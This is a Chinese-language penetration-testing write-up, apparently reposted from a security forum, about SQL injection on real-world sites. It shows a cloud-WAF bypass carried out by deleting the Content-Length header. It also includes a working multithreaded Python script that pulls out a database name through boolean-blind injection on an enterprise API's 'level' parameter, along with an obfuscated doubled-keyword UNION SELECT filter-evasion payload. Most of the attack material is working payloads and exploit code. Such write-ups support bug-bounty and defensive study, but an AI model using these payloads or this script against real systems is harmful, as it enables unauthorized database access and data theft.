![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiadSdQQkeadwbMefGd7yFticD4DEXnpp3oPdtjZZJWAd03q3OZb8ibDBtA/640?wx_fmt=png&from=appmsg)image-20240814110001340

标头 “Content-Length” 的值被置为 4 时, 实际上服务器接收的内容仅仅有 "id=1" 云 WAF 也没有对带有恶意 Payload 的请求拦截, 说明云 WAF 对于普通的 POST 请求提取了 "Content-Length" 标头并进行了判断, 并以此为依据, 作为对整个请求体内容的审查范围

**那如果我进行分块传输能不能绕过呢**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaLeRgRIq4mavWHyfY9v35fURODvYibia0Z0pFKV7kSutvlyibAdibed44Uw/640?wx_fmt=png&from=appmsg)image-20240814105932599

很显然即使 我将 content-length 值设置为 0, 也没有绕过去

但是如果我讲 content-length 删掉

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaY3CQ0v1GuP4iay1bcHg97dn3DMEJO34FFETeXD8nEticGTsR7FzNbTiaQ/640?wx_fmt=png&from=appmsg)image-20240814110202370

云 WAF 居然并没有对恶意 Payload 进行拦截, 而是直接放行给后端, 最终 Payload 被执行

#### 画个了大致概念图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaMiaibWJ5kbPDkxPFGZZiaL3Pey5JSAzTsJmKubhmhOw793PeYiaFYsckXw/640?wx_fmt=png&from=appmsg)image-20240814135147295

明白大致原理, 就好办了

Mssql 也可以利用此绕过

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaecHQdlQloqh1ib8xMXm57r9ictibWGSqRtEicHghMcOTTlrQTZbHTrtPDw/640?wx_fmt=png&from=appmsg)image-20240814135420687![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiazY4Krpu2tkc5DYGwEpCwYzE4Kic1UGnHD0G4VwBQicPW5mVMpnqNUnMQ/640?wx_fmt=png&from=appmsg)image-20240814135458291

### 二

1、某企业 src 存在 sql 注入 url：/api/wx**/** 注点：level

首先通过’和’’判断的这里就不放图了，用的 1=1 和 1=2 的布尔判断发现可以。

2、首先判断了 if 是否可用 发现可以，形成布尔注入如下图：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQianbibRuzzLjjBJySWfK2IfTrBdfMAfoGDEEnSoHN6iaKiba6ND3de3kicew/640?wx_fmt=jpeg&from=appmsg)img![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaJJiaceyUibZkGLtlTFFXrSjwicDIUzlYZ1bbbzicc3SLfrCZibib7pBbflCg/640?wx_fmt=jpeg&from=appmsg)img

3、布尔注入数据库长度 如下图（注入出数据库长度 14）

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiab5rKSoiczL0HyoHzDGZcUdkElmDuvaZyphMcaiaaicWQaicXLGfGYlvu0A/640?wx_fmt=jpeg&from=appmsg)img

4、数据库名：

写了个简单脚本跑出数据库名为 *****

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaFicFGzAM3dEnPPKicpVN7kUQxoFyRcsh9ADBsyZj7OrFvs7BppaynEmg/640?wx_fmt=jpeg&from=appmsg)img

脚本如下:

```
import requests

from threading import Thread

import time

import json

import re

 

def get_dbname(db_len):

  global database_name

  db_name = ""

  headers = {

    "Content-Type": "application/json;charset=UTF-8",

    "Host": "",

    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"

  }

  for num in range(0,255):

        url = ""

        data = {

          "pageNum": 1, "pageSize": 30, "filter": {"level": "1'and 1=if(ord(substr(database(),"+str(db_len+1)+",1))="+str(num)+",1,2)-- "}

            }

        json_data = json.dumps(data)

        response = requests.post(url, data=json_data, headers=headers)

 

        if response.status_code == 200:

          if (re.findall('provinceCode',response.text)):

            db_name += chr(num)

            database_name[db_len] = db_name

            break

        else:

          print("请求失败，状态码为:", response.status_code)

database_name= ["","","","","","","","","","","","","",""]

thread_list = []

def main(de_len):

  start = time.clock()

  for i in range(de_len):

      t = Thread(target=get_dbname,args=(i,))

      thread_list.append(t)

      t.start()

 

  for s in range(len(thread_list)):

    thread_list[s].join()

  print("数据库名:"+database_name)

  end = time.clock()

  times = end - start

  print("程序运行时间为：%d s"%times)

 

if __name__ == "__main__":

  main(14)


```

### 三

访问该站点，观察 URL, 这样的数字字符感觉有 sql 注入

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQianbibRuzzLjjBJySWfK2IfTrBdfMAfoGDEEnSoHN6iaKiba6ND3de3kicew/640?wx_fmt=jpeg&from=appmsg)img

单引号, 然后简单去构造 payload 的

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaJJiaceyUibZkGLtlTFFXrSjwicDIUzlYZ1bbbzicc3SLfrCZibib7pBbflCg/640?wx_fmt=jpeg&from=appmsg)img

```
unionunion /*/$%^*/ selectselect 1,database/**/(),3 -- 1


```

成功爆出数据库库名

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiab5rKSoiczL0HyoHzDGZcUdkElmDuvaZyphMcaiaaicWQaicXLGfGYlvu0A/640?wx_fmt=jpeg&from=appmsg)img

首发于奇安信攻防社区：https://forum.butian.net/share/3709